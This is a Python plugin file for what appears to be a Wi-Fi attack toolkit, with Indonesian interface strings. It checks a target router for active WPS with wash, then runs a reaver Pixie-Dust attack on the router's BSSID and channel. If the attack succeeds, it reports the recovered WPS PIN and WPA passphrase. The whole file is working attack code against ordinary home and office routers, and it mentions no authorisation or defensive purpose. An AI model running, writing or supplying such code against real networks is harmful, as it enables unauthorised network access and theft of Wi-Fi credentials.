# File: attacks/wps_attack.py
from common_utils import run_command, generate_report

class AttackPlugin:
    name = "Serangan WPS Pixie-Dust"
    description = "Sangat efektif jika target rentan (hijau)"
    requires_aggressive_mode = True

    def __init__(self, ui, config):
        self.ui = ui
        self.config = config

    def run(self, monitor_interface, target):
        self.ui.header(self.name)
        _, err = run_command(['which', 'reaver'])
        if err:
            self.ui.error("reaver tidak ditemukan. Harap install ('sudo apt install reaver')."); return
        
        bssid = target[1]; channel = target[2]
        
        self.ui.info(f"Memverifikasi status WPS untuk {target[0]}...")
        wash_output, _ = run_command(['wash', '-i', monitor_interface, '-C'], timeout=10)
        if not wash_output or bssid not in wash_output:
            self.ui.error("Target yang dipilih tidak terdeteksi memiliki WPS aktif. Membatalkan serangan."); return

        self.ui.info("Serangan WPS membutuhkan waktu beberapa menit. Mohon bersabar.")
        self.ui.info("Output dari reaver akan ditampilkan langsung di bawah ini:")
        
        cmd = ['reaver', '-i', monitor_interface, '-b', bssid, '-c', channel, '-K', '1', '-vvv', '--fail-wait=360']
        
        reaver_result, _ = run_command(cmd, stream_output=True)
        
        if "WPA PSK" in reaver_result and "WPS PIN" in reaver_result:
            self.ui.success("Serangan WPS Berhasil!")
            generate_report(self.ui, self.config, target, [("WPS Pixie-Dust", reaver_result)])
        else:
            self.ui.error("Serangan WPS gagal. Router mungkin tidak rentan atau telah terkunci.")
            generate_report(self.ui, self.config, target, [("WPS Pixie-Dust", "Serangan GAGAL. Target tidak rentan.")])